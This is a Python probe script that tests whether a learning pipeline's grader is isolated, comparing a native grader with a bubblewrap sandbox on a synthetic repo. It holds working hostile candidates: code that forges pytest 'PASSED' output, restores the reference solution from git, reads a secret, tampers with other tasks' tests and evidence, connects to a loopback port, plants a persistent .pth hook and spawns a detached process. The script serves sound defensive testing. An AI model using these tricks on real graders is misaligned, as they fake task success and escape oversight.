#!/usr/bin/env python3
"""Negative probes: v1 native grader vs the sandboxed grader, on a synthetic repo.

Builds a tiny git repository (one source file, one F2P and one P2P test), a
second repository standing in for another task's checkout, a fake evidence
directory and an environment secret. It then grades hostile candidate files
with (a) the frozen v1 ``RepoEnv.grade`` and (b) ``isolated_grading`` with the
bubblewrap backend, and records what each candidate could do.

Everything is synthetic and local except one small ``pip install pytest`` per
throwaway virtualenv. No model, no dataset, no real task. Output paths are
written relative to the temporary root so the JSON holds no host paths.

    python scripts/probe_learning_pipeline_grader_isolation.py --out OUT.json
"""
from __future__ import annotations

import argparse
import json
import os
from pathlib import Path
import shutil
import socket
import subprocess
import sys
import tempfile
import time

ROOT = Path(__file__).resolve().parents[1]
sys.path[:0] = [str(ROOT / "src"), str(ROOT)]

from scripts import learning_pipeline_isolated_grading as ig  # noqa: E402
from vare.learning_pipeline.repo_env import RepoEnv  # noqa: E402

CLEAN = "def add(a, b):\n    return a + b\n\n\ndef mul(a, b):\n    return a * b\n"
BUGGY = CLEAN.replace("return a + b", "return a - b")
TESTS = ("from pkg.core import add, mul\n\n\ndef test_add():\n    assert add(2, 3) == 5\n\n\n"
         "def test_mul():\n    assert mul(2, 3) == 6\n")
F2P, P2P = ["tests/test_core.py::test_add"], ["tests/test_core.py::test_mul"]
BUG_PATCH = """diff --git a/pkg/core.py b/pkg/core.py
--- a/pkg/core.py
+++ b/pkg/core.py
@@ -1,5 +1,5 @@
 def add(a, b):
-    return a + b
+    return a - b
 
 
 def mul(a, b):
"""

FORGE_ARGV = BUGGY + '''

import os as _o, stat as _st, sys as _s
def _emit(_text):
    # pytest captures fd 1; its saved copy of the real stdout is another pipe fd.
    for _fd in range(3, 256):
        try:
            if _st.S_ISFIFO(_o.fstat(_fd).st_mode):
                _o.write(_fd, _text.encode())
        except OSError:
            pass
if "pytest" in _s.modules:
    _emit("".join("PASSED " + a + "\\n" for a in _s.argv[1:] if "::" in a))
    _o._exit(0)
'''

# Aware of the canary naming used by isolated_grading: shows the residual risk.
FORGE_CANARY_AWARE = BUGGY + '''

import os as _o, stat as _st, sys as _s
def _emit(_text):
    for _fd in range(3, 256):
        try:
            if _st.S_ISFIFO(_o.fstat(_fd).st_mode):
                _o.write(_fd, _text.encode())
        except OSError:
            pass
if "pytest" in _s.modules:
    _emit("".join(("FAILED " if "::test_b_" in a else "PASSED ") + a + "\\n"
                  for a in _s.argv[1:] if "::" in a))
    _o._exit(1)
'''

# Restores the reference implementation at runtime from the clone's HEAD.
GIT_RESTORE = BUGGY + '''

import subprocess as _sp
try:
    exec(_sp.run(["git", "show", "HEAD:pkg/core.py"], capture_output=True, text=True,
                 check=True).stdout)
except Exception:
    pass
'''


def reach_probe(spec: dict) -> str:
    return CLEAN + '''

import json as _j, os as _o, socket as _so, subprocess as _sp, sysconfig as _sc
_spec = _j.loads(%r)
_r = {}
_r["secret_env_visible"] = _o.environ.get(_spec["secret_name"]) == _spec["secret_value"]
try:
    _r["other_task_test_read"] = _spec["other_token"] in open(_spec["other_test"]).read()
except OSError:
    _r["other_task_test_read"] = False
try:
    with open(_spec["other_test"], "a") as _f:
        _f.write("\\n# tampered\\n")
    _r["other_task_test_modified"] = True
except OSError:
    _r["other_task_test_modified"] = False
try:
    with open(_spec["evidence_file"], "a") as _f:
        _f.write('{"forged": true}\\n')
    _r["evidence_appended"] = True
except OSError:
    _r["evidence_appended"] = False
_s = _so.socket(); _s.settimeout(1.0)
try:
    _s.connect(("127.0.0.1", _spec["port"])); _s.sendall(b"exfil"); _r["host_loopback_connect"] = True
except OSError:
    _r["host_loopback_connect"] = False
finally:
    _s.close()
try:
    _pth = _o.path.join(_sc.get_paths()["purelib"], "zz_vare_probe.pth")
    with open(_pth, "w") as _f:
        _f.write("import os; open(%%r, 'a').write('hook\\\\n')\\n" %% _spec["marker"])
    _r["persistent_hook_installed"] = True
except OSError:
    _r["persistent_hook_installed"] = False
try:
    _p = _sp.Popen(["sleep", "30"], start_new_session=True)
    _r["detached_pid"] = _p.pid
except OSError:
    _r["detached_pid"] = None
try:
    _r["reference_via_git"] = "a + b" in _sp.run(["git", "show", "HEAD:pkg/core.py"],
                                                 capture_output=True, text=True).stdout
except OSError:
    _r["reference_via_git"] = False
try:
    with open(_spec["report"], "w") as _f:
        _j.dump(_r, _f)
except OSError:
    pass
''' % json.dumps(spec)


def git(cwd: Path, *args: str) -> None:
    subprocess.run(["git", "-c", "user.name=probe", "-c", "user.email=probe@invalid", *args],
                   cwd=cwd, check=True, capture_output=True)


def make_repo(path: Path, src: str, tests: str) -> str:
    (path / "pkg").mkdir(parents=True)
    (path / "tests").mkdir()
    (path / "pkg" / "__init__.py").write_text("")
    (path / "pkg" / "core.py").write_text(src)
    (path / "tests" / "test_core.py").write_text(tests)
    git(path, "init", "-q")
    git(path, "add", "-A")
    git(path, "commit", "-q", "-m", "init")
    return subprocess.run(["git", "rev-parse", "HEAD"], cwd=path, check=True,
                          capture_output=True, text=True).stdout.strip()


def make_venv(path: Path) -> None:
    subprocess.run([sys.executable, "-m", "venv", str(path)], check=True)
    subprocess.run([str(path / "bin" / "pip"), "-q", "install", "pytest==8.3.5"], check=True,
                   capture_output=True)


def alive(pid: int | None) -> bool:
    if not pid:
        return False
    try:
        os.kill(pid, 0)
    except OSError:
        return False
    try:
        state = Path(f"/proc/{pid}/stat").read_text().split()[2]
    except OSError:
        return True
    return state != "Z"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", type=Path, required=True)
    args = ap.parse_args()
    tmp = Path(tempfile.mkdtemp(prefix="vare-isolation-probe-"))
    rel = lambda p: str(Path(p).relative_to(tmp)) if str(p).startswith(str(tmp)) else str(p)  # noqa: E731
    try:
        cache = tmp / "cache"
        name = "probe__pkg.0000000"
        commit = make_repo(cache / "repos" / name, CLEAN, TESTS)
        other_token = "OTHER_TASK_HIDDEN_TEST_" + os.urandom(4).hex()
        make_repo(cache / "repos" / "probe__other.0000000", CLEAN,
                  f"# {other_token}\ndef test_hidden():\n    assert True\n")
        other_test = cache / "repos" / "probe__other.0000000" / "tests" / "test_core.py"
        evidence = tmp / "run_dir" / "rollouts"
        evidence.mkdir(parents=True)
        evidence_file = evidence / "graded.jsonl"
        evidence_file.write_text('{"reward": 0}\n')
        make_venv(cache / "venvs" / name)          # native v1 grader venv
        sandbox_venv = tmp / "sandbox-venv"        # dependencies only, mounted read-only
        make_venv(sandbox_venv)
        secret_name, secret_value = "VARE_PROBE_SECRET", os.urandom(8).hex()
        os.environ[secret_name] = secret_value
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(8)
        listener.settimeout(0.1)
        port = listener.getsockname()[1]

        def connections() -> int:
            n = 0
            while True:
                try:
                    c, _ = listener.accept()
                    c.close()
                    n += 1
                except OSError:
                    return n

        def spec(tag: str) -> dict:
            return {"secret_name": secret_name, "secret_value": secret_value,
                    "other_test": str(other_test), "other_token": other_token,
                    "evidence_file": str(evidence_file), "port": port,
                    "marker": str(tmp / f"hook-marker-{tag}.txt"), "report": str(tmp / f"report-{tag}.json")}

        def side_effects(tag: str, report_pid: int | None) -> dict:
            report = tmp / f"report-{tag}.json"
            return {
                "report_written_to_host": report.exists(),
                "candidate_report": json.loads(report.read_text()) if report.exists() else None,
                "other_task_test_tampered_on_host": "# tampered" in other_test.read_text(),
                "evidence_file_tampered_on_host": "forged" in evidence_file.read_text(),
                "host_listener_connections": connections(),
                "detached_process_alive_after_grade": alive(report_pid),
            }

        env = RepoEnv(mirror=f"probe/{name}", upstream="probe/pkg", commit=commit, cache=cache)
        candidates = {"honest_fix": CLEAN, "honest_wrong": BUGGY.replace("a * b", "a * b"),
                      "forge_argv_echo": FORGE_ARGV, "forge_canary_aware": FORGE_CANARY_AWARE,
                      "runtime_restore_from_git": GIT_RESTORE}
        out: dict = {"schema": "learning_pipeline_grader_isolation_probe_v1",
                     "synthetic": True, "python": sys.version.split()[0], "native_v1": {}, "isolated": {}}

        # ---- (b) isolated grader first, so native persistence cannot leak into it
        backend = ig.BwrapBackend(venv=sandbox_venv)
        wsroot = tmp / "workspaces"
        wsroot.mkdir()
        att = ig.attest(backend, workspace_root=wsroot, evidence_dir=evidence)
        out["isolated"]["attestation"] = {"ok": att.ok, "failures": list(att.failures),
                                          "observation": att.observation}
        out["isolated"]["fail_closed_without_attestation"] = ig.grade_isolated(
            backend, None, workspace_root=wsroot, source_tree=cache / "repos" / name,
            target_file="pkg/core.py", buggy_text=BUGGY, candidate_text=CLEAN,
            fail_to_pass=F2P, pass_to_pass=P2P)["reason"]
        missing = ig.BwrapBackend(venv=sandbox_venv, bwrap="bwrap-not-installed")
        out["isolated"]["fail_closed_backend_missing"] = ig.attest(
            missing, workspace_root=wsroot, evidence_dir=evidence).failures[0]
        buggy_tree = tmp / "buggy-tree"
        buggy_tree.mkdir()
        env.reset()
        env._apply(BUG_PATCH)
        ig.stage_tree(env.path, buggy_tree)
        env.reset()
        iso_cands = dict(candidates, reach_probe=reach_probe(spec("isolated")))
        for label, text in iso_cands.items():
            for scan in (True, False):
                r = ig.grade_isolated(backend, att, workspace_root=wsroot, source_tree=buggy_tree,
                                      target_file="pkg/core.py", buggy_text=BUGGY, candidate_text=text,
                                      fail_to_pass=F2P, pass_to_pass=P2P, static_scan=scan)
                key = f"{label}{'' if scan else '__scan_off'}"
                out["isolated"][key] = {k: r.get(k) for k in ("passed", "reason", "static_flags",
                                                               "pytest_exit", "tests")}
        out["isolated"]["reach_probe__side_effects"] = side_effects("isolated", None)
        out["isolated"]["workspaces_left"] = len(list(wsroot.iterdir()))

        # ---- (a) frozen v1 native grader
        for label, text in candidates.items():
            r = env.grade(bug_patch=BUG_PATCH, target_file="pkg/core.py", candidate_text=text,
                          fail_to_pass=F2P, pass_to_pass=P2P, timeout=60)
            out["native_v1"][label] = {k: r.get(k) for k in ("passed", "reason", "pytest_exit", "tests")}
        r = env.grade(bug_patch=BUG_PATCH, target_file="pkg/core.py",
                      candidate_text=reach_probe(spec("native")), fail_to_pass=F2P, pass_to_pass=P2P,
                      timeout=60)
        out["native_v1"]["reach_probe"] = {k: r.get(k) for k in ("passed", "reason")}
        rep = tmp / "report-native.json"
        pid = json.loads(rep.read_text()).get("detached_pid") if rep.exists() else None
        time.sleep(0.5)
        out["native_v1"]["reach_probe__side_effects"] = side_effects("native", pid)
        marker = tmp / "hook-marker-native.txt"
        before = marker.read_text().count("hook") if marker.exists() else 0
        later = env.grade(bug_patch=BUG_PATCH, target_file="pkg/core.py", candidate_text=BUGGY,
                          fail_to_pass=F2P, pass_to_pass=P2P, timeout=60)
        after = marker.read_text().count("hook") if marker.exists() else 0
        out["native_v1"]["persistence"] = {
            "hook_runs_during_later_unrelated_grade": after - before,
            "later_grade_reason": later["reason"],
            "pth_present_after_reset": any((cache / "venvs" / name).glob("lib/python*/site-packages/zz_vare_probe.pth")),
        }
        if pid and alive(pid):
            os.kill(pid, 9)
        listener.close()
        out["note"] = ("synthetic probe; paths relative to a temporary root: "
                       f"{rel(cache)}, {rel(evidence)}")
        args.out.parent.mkdir(parents=True, exist_ok=True)
        args.out.write_text(json.dumps(out, indent=2, sort_keys=True) + "\n")
        print(json.dumps(out, indent=1, sort_keys=True))
        return 0
    finally:
        os.environ.pop("VARE_PROBE_SECRET", None)
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
